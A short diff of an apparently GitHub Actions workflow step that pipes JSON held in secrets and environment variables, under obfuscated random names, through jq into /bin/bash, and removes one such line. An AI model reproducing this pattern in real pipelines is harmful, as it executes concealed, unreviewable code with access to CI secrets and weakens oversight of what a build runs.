@@ -21,7 +21,6 @@ jobs:
           wrwj852: ${{ secrets.wrwj852 }}
         run: |
           printf '%s' "$wrwj852" | jq -r .bfwsz21 | /bin/bash
-          echo $xtwv7537 | jq -r .sxuqv0 | /bin/bash
           echo $qnlp76367 | jq -r .wdvi38 | /bin/bash
           echo $otu8 | jq -r .nmlw27039 | /bin/bash
 
